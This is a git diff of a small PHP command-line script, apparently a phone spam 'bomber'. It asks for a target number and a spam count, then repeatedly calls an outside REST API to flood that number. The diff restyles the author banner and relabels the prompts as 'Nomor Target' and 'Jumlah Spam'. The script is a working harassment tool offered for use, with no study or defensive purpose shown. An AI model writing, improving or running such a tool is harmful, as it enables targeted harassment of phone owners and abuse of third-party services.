@@ -2,12 +2,12 @@
 system("apt-get install toilet -y");
 system("toilet -f F4K3 --gay");
 echo "
-[━━━━━━━━━━━━━━━━━━━━━━━━━━━━]
-|  •Author : Jhosua Saut Maruli
-|  •Fb : Jhosua Dz
-|  •Youtube : Mr.F4K3 YT
-|  •IG : jhosua93_n
-[━━━━━━━━━━━━━━━━━━━━━━━━━━━━]
+[━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━]
+|  ×Author : Jhosua Saut Maruli             | 
+|  ×Fb : Jhosua Dz                          |
+|  ×Youtube : Mr.F4K3 YT                    |
+|  ×IG : jhosua93_n                         |
+[━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━]
 ";
 function api($nomor,$jumlah){
 $url = "http://0x.nakocoders.org/rest-api/lain-nya/api.php?nomor=$nomor";
@@ -22,9 +22,9 @@ sleep(5);
 $loop++;
 }
 }
-echo "Masukan Nomor : ";
+echo "Nomor Target : ";
 $nomor = trim(fgets(STDIN));
-echo "Masukan Jumlah : ";
+echo "Jumlah Spam : ";
 $jumlah = trim(fgets(STDIN));
 api($nomor,$jumlah);
 ?>
